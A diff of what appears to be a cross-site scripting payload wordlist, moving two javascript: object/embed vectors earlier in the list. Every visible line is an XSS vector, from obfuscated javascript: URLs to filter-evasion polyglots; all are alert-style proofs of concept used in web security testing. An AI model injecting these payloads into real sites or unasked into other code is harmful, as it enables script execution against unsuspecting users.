@@ -38,6 +38,8 @@
 <svg><use href=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" />
 <a href=\"javascript://%0aalert(1)\">XSS</a>
 <base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>
+<object data=\"javascript:alert(1)\">
+<embed src=\"javascript:alert(1)\">
 <object data=# codebase=javascript:alert(document.domain)//>
 <embed src=# codebase=javascript:alert(document.domain)//>
 <object data=\"#\nalert(1)\" codebase=javascript://>
@@ -1025,8 +1027,6 @@ javascript:\/*--><\/title><\/style><\/textarea><\/script><\/xmp><svg\/onload='+\
 javascript:\"\/*'\/*`\/*--><\/noscript><\/title><\/textarea><\/style><\/template><\/noembed><\/script><html \\\"\n onmouseover=\/*&lt;svg\/*\/onload=alert()\/\/>
 javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/ontoggle='+\/`\/+\/\"\/+\/onmouseover=1\/+\/[*\/[]\/+alert(\/@PortSwiggerRes\/)\/\/'>
 <iframe src=\"javascript:alert(1)\">
-<object data=\"javascript:alert(1)\">
-<embed src=\"javascript:alert(1)\">
 <a href=\"javascript:alert(1)\">XSS</a>
 <a href=\"JaVaScript:alert(1)\">XSS</a>
 <a href=\" \tjavascript:alert(1)\">XSS</a>
